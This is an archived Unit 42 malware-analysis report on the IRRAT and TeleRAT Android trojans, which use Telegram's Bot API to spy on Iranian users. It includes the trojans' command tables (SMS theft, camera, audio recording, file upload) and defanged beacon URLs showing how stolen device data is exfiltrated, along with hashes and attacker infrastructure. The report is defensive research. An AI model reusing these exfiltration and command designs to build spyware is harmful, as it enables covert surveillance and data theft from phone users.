{
    "id": "86583122-9620-4f5a-bf6d-1dad4d6f1f7d",
    "created_at": "2023-01-12T15:05:25.627071Z",
    "updated_at": "2025-03-27T02:05:54.251321Z",
    "deleted_at": null,
    "sha1_hash": "40bbf64a6fb90b299d963e8be3304fa8141b0627",
    "title": "2018-03-20 - TeleRAT- Another Android Trojan Leveraging Telegram’s Bot API to Target Iranian Users",
    "authors": "",
    "file_creation_date": "2022-05-28T16:57:52Z",
    "file_modification_date": "2022-05-28T16:57:52Z",
    "file_size": 1413947,
    "plain_text": "# TeleRAT: Another Android Trojan Leveraging Telegram’s Bot API to Target Iranian Users\n\n**researchcenter.paloaltonetworks.com/2018/03/unit42-telerat-another-android-trojan-leveraging-telegrams-bot-api-to-target-iranian-**\nusers/\n\nRuchna Nigam, Kyle Wilhoit March 20, 2018\n\nBy [Ruchna Nigam and](https://unit42.paloaltonetworks.com/author/ruchna-nigam/) [Kyle Wilhoit](https://unit42.paloaltonetworks.com/author/kyle-wilhoit/)\n\nMarch 20, 2018 at 1:00 PM\n\n[Category: Unit 42](https://unit42.paloaltonetworks.com/category/unit42/)\n\nTags: [Android,](https://unit42.paloaltonetworks.com/tag/android/) [Iran,](https://unit42.paloaltonetworks.com/tag/iran/) [IRRAT,](https://unit42.paloaltonetworks.com/tag/irrat/) [Telegram’s Bot API,](https://unit42.paloaltonetworks.com/tag/telegrams-bot-api/) [TeleRAT](https://unit42.paloaltonetworks.com/tag/telerat/)\n\nThis post is also available in: 日本語 [(Japanese)](https://unit42.paloaltonetworks.jp/unit42-telerat-another-android-trojan-leveraging-telegrams-bot-api-to-target-iranian-users/)\n\nSummary\n\nTelegram Bots are special accounts that do not require an additional phone number to setup and are\ngenerally used to enrich Telegram chats with content from external services or to get customized\n[notifications and news. And while Android malware abusing Telegram's Bot API to target Iranian users is](https://core.telegram.org/bots/api)\n[not fresh news (the emergence of a Trojan using this method called IRRAT was discussed in June and](https://news.drweb.com/show/?i=11331&lng=en)\n[July 2017), we set out to investigate how these Telegram Bots were being abused to command and](https://blog.avast.com/spyware-targets-iranian-android-users-by-abusing-messaging-app-telegram-bot-api)\ncontrol malicious Android applications.\n\nThis blog details our findings navigating through some Operational Security (OPSEC) fails while sifting\nthrough multiple malicious APK variants abusing Telegram's Bot API; including the discovery of a new\nTrojan we've named “TeleRAT”. TeleRAT not only abuses Telegram's Bot API for Command and Control\n(C2), it also abuses it for data exfiltration, unlike IRRAT.\n\nWhat We Already Know- IRRAT\n\nBased on previous reports, we know Telegram's Bot API was already being employed by attackers to\nsteal information ranging from SMS and call history to file listings from infected Android devices. The\nmajority of the apps we saw disguise themselves as an app that tells you how many views your Telegram\n\n\n-----\n\nprofile received – needless to say, the information provided is inaccurate as Telegram doesn t allow for\npopulating any such information.\nWe continue to see IRRAT active in the wild to this date.\nWe used the below sample for this analysis.\n\n**SHA256** 1d0770ac48f8661a5d1595538c60710f886c254205b8cf517e118c94b256137d\n\nTeleRAT works by creating and then populating the following files on the phone’s SD Card and sending\nthem to the upload server, after the app’s first launch:\n\n“[IMEI] numbers.txt”: Contact information\n“[IMEI]acc.txt”: List of Google accounts registered on the phone\n“[IMEI]sms.txt”: SMS history\n1.jpg: Picture taken with the front-facing camera\nImage.jpg: Picture taken with back-facing camera\n\nFinally, it reports back to a Telegram bot (identified by a bot ID hardcoded in each RAT’s source code)\nwith the below beacon, and the application icon is then hidden from the phone's app menu:\n\nhxxp://api.telegram.org/bot[APIKey]/sendmessage?chat_id=[ChatID]?text=ﻧﺼﺐ ﺟﺪﯾﺪ\\n [IMEI] \\nIMEI : :\n\n[IMEI]\\nAndroid ID : [AndroidID]\\nModel : [PhoneModel]\\n[IP] \\n\\nIMEI دﺳﺘﮕﺎه: [IMEI]\n\nIn the background, the app continues to beacon to the Telegram bot at regular intervals and listens for\ncertain commands, as detailed below.\n\n**Command** **Action** **Communication to Telegram bot**\n\n\ncall@[IMEI]@[Number] Places a call to\n\n[Number]\n\nsms@[IMEI]@[Number]@[Text] SMS [Text] to\n\n[Number]\n\ngetapps@[IMEI] Saves a list of\ninstalled apps to\nSD Card to file\nnamed “[IMEI]\napps.txt\",\nuploads to\nupload server\n\ngetfiles@[IMEI]@[DirPath] Retrieves file\nlisting from\n\n[DirPath], saves\nto SD Card as\n“[IMEI]files.txt”,\nuploads to server\n\ngetloc@[IMEI] Starts a GPS\nlistener that\nmonitors location\nchanges\n\n\nhxxps://api.telegram.org/bot[APIKey]/sendmessage?\nchat_id=[ChatID]&text=call with [Number]\n\nhxxps://api.telegram.org/bot[APIKey]\n/sendmessage?chat_id=[ChatID]&text=sent\n\nNone\n\nNone\n\nNone\n\n\n-----\n\nupload@[IMEI]@[FilePath] Uploads file at\n\n[FilePath]\n\n\nremoveA@[IMEI]@[FilePath on\nSDCard]\n\nremoveB@[IMEI]@[DirPath on\nSDCard]\n\n\nDeletes file at\n\n[FilePath on\nSDCard]\n\nDeletes [DirPath\non SDCard]\n\n\nlstmsg@[IMEI] Saves SMS\nhistory to SD\nCard as\n”[IMEI]lstmsg.txt”,\nuploads to server\n\nyehoo@[IMEI] Takes a picture\nwith Front\nCamera, saves\nto SD Card as\n“yahoo.jpg”,\nuploads to server\n\n_Table 1: List of IRRAT bot commands_\n\n\nNone\n\nhttps://api.telegram.org/bot[APIKey]/sendmessage?\nchat_id=[ChatID]&text= ______________[FilePath\non SDCard]\n\nNone\n\nNone\n\nNone\n\n\nAs the table above shows, this IRRAT sample makes use of Telegram's bot API solely to communicate\ncommands to infected devices. The stolen data is uploaded to third party servers, several of which\nemploy a webhosting service. Fortunately for us, these servers had several OPSEC fails. More on that\nfurther below.\n\nA New Family- TeleRAT\nWhile sifting through IRRAT samples, using AutoFocus, we came across another family of Android RATs\nseemingly originating from and/or targeting individuals in Iran that not only makes use of the Telegram\nAPI for C2 but also for exfiltrating stolen information.\n\n_Figure 1: pivoting in autofocus for applications using the Telegram bot API_\n\nWe named this new family “TeleRAT” after one of the files it creates on infected devices.\n\nWe used the below sample for this analysis.\n\n\n-----\n\n**SHA256** 01fef43c059d6b37be7faf47a08eccbf76cf7f050a7340ac2cae11942f27eb1d\n\nPost-installation TeleRAT creates two files in the app’s internal directory:\n\ntelerat2.txt containing a slew of information about the device - including the System Bootloader\nversion number, total and available Internal and External memory size, and number of cores.\nthisapk_slm.txt mentioning a Telegram channel and a list of commands. We investigate this\nTelegram channel is greater detail further below.\n\nThe RAT announces its successful installation to the attackers by sending a message to a Telegram bot\nvia the Telegram Bot API with the current date and time.\n\nMore interestingly, it starts a service that listens for changes made to the Clipboard in the background.\n\n_Figure 2: Code snippet that listens for clipboard changes_\n\nFinally, the app fetches updates from the Telegram bot API every 4.6 second, listening for the following\ncommands (we used Google Translate for the below Farsi (Persian) translations):\n\n**Command** **Translation**\n\nدرﯾﺎﻓﺖ ﻣﺨﺎﻃﺒﯿﻦGet contacts\n\nدرﯾﺎﻓﺖ ﮐﻠﯿﭗ ﺑﻮردGet the clipboard\n\nClipboard set:[text]\n\nدرﯾﺎﻓﺖ ﻣﮑﺎنGet location\n\nدرﯾﺎﻓﺖ اﻃﻼﻋﺎت ﺷﺎرژReceive charging information\n\nAll file list:/[path]\n\nRoot file list:/[path]\n\nدرﯾﺎﻓﺖ ﺑﺮﻧﺎﻣﻪ ﻫﺎGet apps\n\n1Downloadfile/[filename]\n\n2Downloadfile/[filename]\n\nCreateContact/[name]/[number]\n\nSetWallpaper http[URL]\n\nدرﯾﺎﻓﺖ ﭘﯿﺎم ﻫﺎReceive (SMS) messages\n\n\n-----\n\nSendsmsfor/[destination]/[text]\n\nMessageShow[text]\n\n**1ﮔﺮﻓﺘﻦ ﻋﮑﺲTake photo 1 (front camera)**\n\n**2ﮔﺮﻓﺘﻦ ﻋﮑﺲTake photo 2 (back camera)**\n\nدرﯾﺎﻓﺖ وﺿﻌﯿﺖGet status\n\nدرﯾﺎﻓﺖ ﺗﻤﺎس ﻫﺎReceive calls\n\nDeleteDir[dirname]\n\nﺳﺎﯾﻠﻨﺖSilent (set to Vibrate mode)\n\nﺻﺪادارLoud (set to normal Ringer mode)\n\nﺑﯿﺼﺪاSilent (set to Silent mode)\n\nBlacksc Blacks out phone screen\n\nBlackscf Clears black screen\n\nﺿﺒﻂ ﻓﯿﻠﻢAudio recording (saves recorded audio to\n\nAUDIO123/MUSIC/rec123.m4a on SD Card)\n\nﺗﻮﻗﻒ ﺿﺒﻂ ﻓﯿﻠﻢStop audio recording\n\nراﻫﻨﻤﺎی دﺳﺘﻮراتInstruction manual (Help Menu)\n\n**call to [number]**\n\n**RESET** (deletes thisapk_slm.txt and sends a new registration message to\nTelegram bot)\n\nدرﯾﺎﻓﺖ ﮔﺎﻟﺮیGet gallery (sends files from the /Dcim folder on the SD Card to\n\nTelegram bot)\n\n**Delete app files or درﯾﺎﻓﺖ ﮔﺎﻟﺮی**\n\n**Vibrate [x]** (Causes phone to vibrate for x seconds, with a maximum value of\n600 secs)\n\nﻟﺮزش ﮐﻢLow vibration (for a duration of 150 secs)\n\nﻟﺮزش ﻣﺘﻮﺳﻂMedium vibration (350 secs)\n\nﻟﺮزش زﯾﺎدShake too much (600 secs)\n\n_Table 2: List of TeleRAT bot commands_\n\nAside from additional commands, this new family’s main differentiator to IRRAT is that it also uploads\n[exfiltrated data using Telegram's sendDocument API method.](https://core.telegram.org/bots/api#senddocument)\n\n\n-----\n\n_Figure 3: Code snippet showing the use of the SendDocument Telegram bot API method_\n\nTeleRAT is an upgrade from IRRAT in that it eliminates the possibility of network-based detection that is\nbased on traffic to known upload servers, as all communication (including uploads) is done via the\nTelegram bot API. However, it still leaves other doors open via Telegram's bot API, since the API Keys\nare hardcoded in the APKs.\n\nThe API allows fetching updates by two means:\n\n1.The [getUpdates method: Using this exposes a history of all the commands that were sent to the bot,](https://core.telegram.org/bots/api#getupdates)\nincluding usernames from which the commands originated. From the bots that were still responding and\nhad an update history (incoming updates are only kept for 24 hours as per Telegram's policy), we were\nable to find bot commands originating from four Telegram accounts, shown below.\n\n_Figure 4: Telegram usernames revealed from bot command histories_\n\n[2. Using a Webhook: Telegram allows redirecting all bot updates to a URL specified by means of a](https://core.telegram.org/bots/api#setwebhook)\nWebhook. Their policy limits these Webhooks to HTTPS URLs only. While most of the Webhooks we\nfound used certificates issued by Let’s Encrypt with no specific registrar information, some of them led us\nback to the world of third party webhosting and open directories. Let’s Encrypt has been notified about\nthis activity.\n\nA sample of only a few Webhooks we found are shown below. hxxps://mr-mehran[.]tk/pot/Bot/ in\nparticular appears to be hosting close to 6500 bots, however, we can’t confirm whether they’re all used\nfor malicious purposes.\n\n_Figure 5: Webhooks found associated with some TeleRAT bots_\n\n\n-----\n\nOPSEC Fails, Distribution Channels & Attribution\nIn our research we were able find what was clearly an image of the botmaster testing out the RAT, based\non the Telegram bot interface that can be seen on the monitor pictured in the lower half of Figure 6.\n\n_Figure_ _6: Image of botmaster testing out the RAT_\n\nWe were also able to find exfiltrated messages that confirmed our theory about the test run and reveals a\nthread in Persian Farsi seemingly discussing bot setup.\n“ اﻧﻼﯾﻦ ﺷﻮ ﺗﺎ روﺑﺎﺗﻪ رو اﻣﺘﺤﺎن ﮐﻨﯿﻢ۶ ﺻﺒﺢ ﺳﺎﻋﺖ”\nGoogle Translation: “Morning 6 hours online to try the robotage”\nWhile investigating attribution for TeleRAT, we noticed the developers made no effort to hide their\nidentities in the code. One username is seen in the screenshot below.\n\n_Figure 7: Telegram channel advertised in source code_\n\n\n-----\n\nLooking further into the vahidmail67 Telegram channel, we found advertisements for applications and\nbuilders that ran the entire gamut - from applications that get you likes and followers on Instagram, to\nransomware, and even the source code for an unnamed RAT (complete with a video tutorial, shown\nbelow).\n\n_Figure 8: Screenshot from a Telegram channel advertising & sharing a RAT source code_\n\nAside from the Telegram channel, while looking for references to certain TeleRAT components we\n[stumbled upon some](https://learn-net.ir/forums/topic/5901-%D8%A7%D8%B3%D8%AA%D9%81%D8%A7%D8%AF%D9%87-%D8%A7%D8%B2-%DA%A9%D8%AA%D8%A7%D8%A8%D8%AE%D8%A7%D9%86%D9%87-tp_getupdate-%D8%AF%D8%B1-%D8%B3%D8%B1%D9%88%DB%8C%D8%B3/) [threads on an Iranian programmers’ forum advertising the sale of a Telegram bot](https://learn-net.ir/forums/topic/5360-%D8%B3%D9%88%D8%B1%D8%B3-%D9%87%D9%85%DA%AF%D8%A7%D9%85-%D8%B3%D8%A7%D8%B2%DB%8C-%D8%AF%DB%8C%D8%AA%D8%A7%D8%A8%DB%8C%D8%B3-%D8%A2%D9%81%D9%84%D8%A7%DB%8C%D9%86-%D8%A8%D8%A7-%D9%BE%D8%B3%D8%AA-%D9%87%D8%A7%DB%8C-%DA%A9%D8%A7%D9%86%D8%A7%D9%84-%D8%AA%D9%84%DA%AF%D8%B1%D8%A7%D9%85/)\ncontrol library. The forum is frequented by some of the developers whose code is heavily reused in a big\nportion of the TeleRAT samples we came across.\n\n\n-----\n\n_Figure 9: Advertisement for sale of a Telegram bot control library_\n\nThe forum goes the extra mile to mention all content is in accordance with Iran's laws. However, it's hard\nto see any non-malicious use for some of the code advertised there or written by developers that frequent\nit – for instance, a service that runs in the background listening for changes to the Clipboard (pictured in\nthe code snippet in Figure 3 further above).\n\n_Figure 10: Forum Disclaimer_\n\nOverall, TeleRAT pieces together code written by several developers, however, due to freely available\nsource code via Telegram channels and being sold on forums, we can’t point to one single actor\ncommanding either IRRAT or TeleRAT and it appears to be the work of several actors possibly operating\ninside of Iran.\n\nVictimology\n\nAs we investigated these RATs, we also started looking at how victims were getting infected. Further\ninvestigating, we witnessed several third-party Android application stores distributing seemingly legitimate\napplications like \"Telegram Finder\", which supposedly helps users locate and communicate with other\nuses with specific interests, like knitting. Also, we've witnessed several samples distributed and shared\nvia both legitimate and nefarious Iranian Telegram channels.\n\n\n-----\n\n_Figure 11: leIranian third-party application store_\n\nLooking closer at the malicious APKs we were able to get an understanding of common application\nnaming conventions and functionality across the board.\n\n_Figure 12: 'Telegram finder' application_\n\nBased on the samples we analysed, the three most common application names for both IRRATand\nTeleRAT are:\n\n\n-----\n\n**Native App Name** **Translated App Name**\n\n**ﭘﺮوﻓﺎﯾﻞ ﭼﮑﺮ** Profile Cheer\n\n**ﯾﺎب ﺗﻠﮕﺮام** **ﺑﺎزدﯾﺪ** Telegram Finder\n\ntelegram hacker N/A\n\nAdditionally, there were several malicious APKs disguised as fake VPN software and/or configuration\nfiles, such as \"atom vpn\" and \"vpn for telegram.\n\nThere appears to be a total identified victim count of 2,293 at the time of writing, based on the\ninfrastructure we analysed. There appears to be a rather small range of geographically dispersed victims,\nwith 82% of having Iranian phone numbers.\n\nIran 1894\n\nPakistan 10\n\nIndia 227\n\nAfghanistan 109\n\nUnited Kingdom 53\n\nThere may also be additional infrastructure or variants we were unaware of at the time of writing. That\nsaid, the number of victims likely residing within Iran far exceeds the victim count for any other country.\n\nConclusion\n\nPart of dissecting and understanding new threats involve looking closer at already established campaigns\nand malware variants. This is a perfect example of just that; looking closer at a previously established\nmalware family to better understand it's current and possibly changed capabilities.\n\nWhile malware leveraging the Telegram bot API is not necessarily new, we were able to identify a new\nfamily, TeleRAT, hiding entirely behind Telegram's API to evade network-based detection and exfiltrate\ndata. Leveraging intelligence from AutoFocus, accessible attacker infrastructure, and other open source\nintelligence we were able to paint an accurate picture of an ongoing operation leveraging Telegram's API\nand targeting users via third party application sites and social media channels.\n\nTaking some basic precautions can help users protect themselves from malicious applications like\nTeleRAT, such as:\n\nAvoid third-party application stores or sources.\nDon't allow application sideloading on your device.\nEnsure the application you are installing is official, regardless of source.\nClosely review and scrutinize application permission requests prior to installation.\n\nPalo Alto Networks customers are protected from this threat by:\n\n1. WildFire detects all TeleRAT and IRRAT files with malicious verdicts.\n[2. AutoFocus customers can track these samples with the IRRAT and](https://autofocus.paloaltonetworks.com/#/tag/Unit42.IRRAT) [TeleRAT](https://autofocus.paloaltonetworks.com/#/tag/Unit42.TeleRAT)\n3. Traps blocks all of the APK files associated with TeleRAT and IRRAT.\n\nAPPENDIX\n\n\n-----\n\n**Telegram usernames found commanding IRRAT or TeleRAT**\n\nAhmad_ghob\n\nMy_LiFe_M_a_H_s_A\n\nmmm1230a\n\n**Webooks**\n\nhxxps://mr-mehran.tk/pot/Bot/robotcreat2_bot/Bot/Ejsahahbot/\n\nhxxps://ib3.ibot24.com/394083/\n\nhxxps://rr5.000webhostapp.com/upload_file.php\n\nhxxps://gold.teleagent.ir/bnrdehisaz/index.php\n\nhxxps://shahin-soori.ir/bots/rat/upload_file.php\n\nhxxps://mbosoba.000webhostapp.com/upload_file.php\n\nhxxps://abolking.000webhostapp.com/upload_file.php\n\nhxxps://botmohsan-apk.000webhostapp.com/Bot/bot.php\n\nhxxps://androydiha.ir/bot/Bot/hackelmi_bot/index.php\n\nhxxps://hamidhamid954321.000webhostapp.com/Bot/bot.php\n\nhxxps://mohsan024024.000webhostapp.com/upload_file.php\n\nhxxps://09152104574nazimilad.000webhostapp.com/رﺑﺎت ﺳﺎز/CreateBotAll.php\n\nhxxps://darkforceteam.000webhostapp.com/SmartAccounts_Bot/bots/Ratjadidebot/index.php\n\n**Get updates from**\n\n**Palo Alto**\n\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-03-20 - TeleRAT- Another Android Trojan Leveraging Telegram’s Bot API to Target Iranian Users.pdf"
    ],
    "report_names": [
        "2018-03-20 - TeleRAT- Another Android Trojan Leveraging Telegram’s Bot API to Target Iranian Users.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535925,
    "ts_updated_at": 1743041154,
    "ts_creation_date": 1653757072,
    "ts_modification_date": 1653757072,
    "files": {
        "pdf": "https://archive.orkl.eu/40bbf64a6fb90b299d963e8be3304fa8141b0627.pdf",
        "text": "https://archive.orkl.eu/40bbf64a6fb90b299d963e8be3304fa8141b0627.txt",
        "img": "https://archive.orkl.eu/40bbf64a6fb90b299d963e8be3304fa8141b0627.jpg"
    }
}